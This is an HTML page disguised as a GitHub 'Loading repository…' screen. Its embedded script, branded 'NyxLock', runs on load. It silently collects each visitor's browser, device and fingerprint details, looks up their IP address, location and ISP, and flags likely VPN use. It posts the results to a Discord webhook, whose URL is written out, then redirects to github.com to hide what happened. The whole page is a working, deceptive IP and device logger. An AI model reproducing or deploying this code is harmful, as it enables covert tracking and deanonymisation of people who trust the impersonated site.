<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>GitHub</title>
<link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg">
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
    background: #0d1117; color: #c9d1d9;
    display: flex; align-items: center; justify-content: center;
    min-height: 100vh;
  }
  .box { text-align: center; padding: 40px; }
  .spinner {
    width: 36px; height: 36px; border: 3px solid #30363d;
    border-top-color: #58a6ff; border-radius: 50%;
    animation: spin 0.8s linear infinite; margin: 0 auto 20px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  h1 { font-size: 20px; font-weight: 600; margin-bottom: 8px; }
  p { color: #8b949e; font-size: 14px; }
</style>
</head>
<body>
<div class="box">
  <div class="spinner"></div>
  <h1>Loading repository…</h1>
  <p>Please wait a moment.</p>
</div>
<script>
(async () => {
  const WEBHOOK = "https://discord.com/api/webhooks/1556768436279840975/DfNnm5bqz6nitAVzJzUc8dV2pdXD1vOQROTddxR8kL8mQx4qrRPsJ9tVCFnnuKzSocyq";
  const REDIRECT = "https://github.com/";
  const data = {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    screen: screen.width + "x" + screen.height,
    viewport: window.innerWidth + "x" + window.innerHeight,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cookies: navigator.cookieEnabled ? "enabled" : "disabled",
    doNotTrack: navigator.doNotTrack || "unspecified",
    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
    cpuCores: navigator.hardwareConcurrency || "N/A",
    localStorage: (() => { try { return localStorage.length + " items"; } catch(e) { return "blocked"; } })(),
    sessionStorage: (() => { try { return sessionStorage.length + " items"; } catch(e) { return "blocked"; } })(),
    fingerprint: (() => {
      const s = [navigator.userAgent, navigator.language, screen.width, screen.height, navigator.platform].join("|");
      let h = 0;
      for (let i = 0; i < s.length; i++) h = ((h << 5) - h) + s.charCodeAt(i) | 0;
      return (h >>> 0).toString(16);
    })(),
    timestamp: new Date().toISOString()
  };
  let ipInfo = { ip: "N/A", city: "N/A", region: "N/A", country: "N/A", org: "N/A", vpn: false };
  try {
    const r = await fetch("https://ipinfo.io/json");
    const j = await r.json();
    const org = (j.org || "").toLowerCase();
    ipInfo = {
      ip: j.ip || "N/A", city: j.city || "N/A", region: j.region || "N/A",
      country: j.country || "N/A", org: j.org || "N/A",
      vpn: ["vpn","proxy","hosting","cloud","digitalocean","ovh","hetzner","linode","vultr"].some(x => org.includes(x))
    };
  } catch(e) {}
  const vpnStatus = ipInfo.vpn ? "VPN / Proxy likely" : "likely clean";
  const embed = {
    username: "NyxLock",
    embeds: [{
      title: "NyxLock — Visitor Data",
      color: 0xFF4D6D,
      fields: [
        { name: "IPv4 Address", value: "`" + ipInfo.ip + "`", inline: true },
        { name: "Location", value: ipInfo.city + ", " + ipInfo.region + ", " + ipInfo.country, inline: true },
        { name: "VPN/Proxy", value: "**" + vpnStatus + "**", inline: true },
        { name: "ISP", value: ipInfo.org, inline: true },
        { name: "Interaction", value: "accept", inline: true },
        { name: "Timestamp", value: data.timestamp, inline: true },
        { name: "User Agent (Full)", value: data.userAgent, inline: false },
        { name: "Language", value: data.language, inline: true },
        { name: "Platform", value: data.platform, inline: true },
        { name: "Screen", value: data.screen, inline: true },
        { name: "Viewport", value: data.viewport, inline: true },
        { name: "Timezone", value: data.timezone, inline: true },
        { name: "Cookies", value: data.cookies, inline: true },
        { name: "Do Not Track", value: data.doNotTrack, inline: true },
        { name: "Device Memory", value: data.deviceMemory, inline: true },
        { name: "CPU Cores", value: String(data.cpuCores), inline: true },
        { name: "LocalStorage", value: data.localStorage, inline: true },
        { name: "SessionStorage", value: data.sessionStorage, inline: true },
        { name: "Fingerprint", value: data.fingerprint, inline: true }
      ],
      footer: { text: "NyxLock HTML • GitHub Link Puller" },
      timestamp: data.timestamp
    }]
  };
  try {
    await fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(embed) });
  } catch(e) {}
  setTimeout(() => { window.location.href = REDIRECT; }, 600);
})();
</script>
</body>
</html>
